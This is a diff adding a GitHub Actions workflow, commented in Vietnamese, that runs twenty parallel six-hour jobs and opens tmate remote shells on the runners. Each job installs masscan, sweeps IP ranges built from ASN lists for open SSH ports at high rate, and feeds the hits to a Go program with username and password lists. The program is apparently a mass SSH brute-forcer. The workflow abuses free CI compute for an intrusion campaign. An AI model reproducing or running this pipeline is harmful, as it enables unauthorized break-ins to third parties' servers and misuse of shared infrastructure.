@@ -1,1 +1,81 @@
 
+name: CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # Tăng timeout lên 6h
+
+    strategy:
+      fail-fast: false  # Quan trọng: job lỗi không ảnh hưởng job khác
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: sudo apt update && sudo apt install wget tmate -y
+
+      - name: Start tmate in background
+        run: |
+          # Start tmate session và giữ nó chạy ngầm
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+          
+          # Hiển thị thông tin kết nối
+          echo "🟢 TMATE SESSION STARTED"
+          echo "SSH: $(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')"
+          echo "WEB: $(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')"
+          
+          # Giữ session alive trong background (6 giờ)
+          while true; do
+            sleep 60
+            echo "🤖 Tmate session still active for instance ${{ matrix.instance }}"
+          done &
+          TMATE_LOOP_PID=$!
+          echo "TMATE_PID=$TMATE_LOOP_PID" >> $GITHUB_ENV
+
+      - name: Print job info
+        run: echo "🔹 Running instance ${{ matrix.instance }} with tmate"
+
+      - name: Run main script (with tmate running)
+        continue-on-error: true  # Step lỗi vẫn chạy step tiếp theo
+        run: |
+          echo "📦 Downloading and running setup..."
+          set +e  # Tắt exit-on-error
+          apt install sudo -y
+          sudo apt install wget -y
+          sudo apt install golang -y
+          sudo apt install masscan -y
+          sudo apt install libpcap-dev -y
+          sudo apt install python3 -y
+   
+          echo "Chạy script Python để xử lý ASN..."
+          python3 asn.py
+    
+          echo "Bắt đầu quét masscan..."
+          sudo masscan -iL ipv4.txt -p22 --rate=15000 | awk '/Discovered/{split($4,p,"/"); print $6 ":" p[1]}' > open.txt
+    
+          echo "Khởi tạo và chạy Go program..."
+          go mod init telee.go
+          go mod tidy
+          go run telee.go user.txt pass.txt open.txt 20 50 500 &
+          SETUP_PID=$!
+          
+          # Chờ script chính chạy nhưng vẫn giữ tmate active
+          wait $SETUP_PID || echo "⚠️ Setup script exited with error, but continuing..."
+
+      - name: Keep alive after main script
+        if: always()  # Luôn chạy kể cả thành công hay thất bại
+        continue-on-error: true
+        run: |
+          echo "⏳ Main script finished, but keeping tmate alive for 6 hours..."
+          sleep 21600  # 6 giờ = 21600 giây
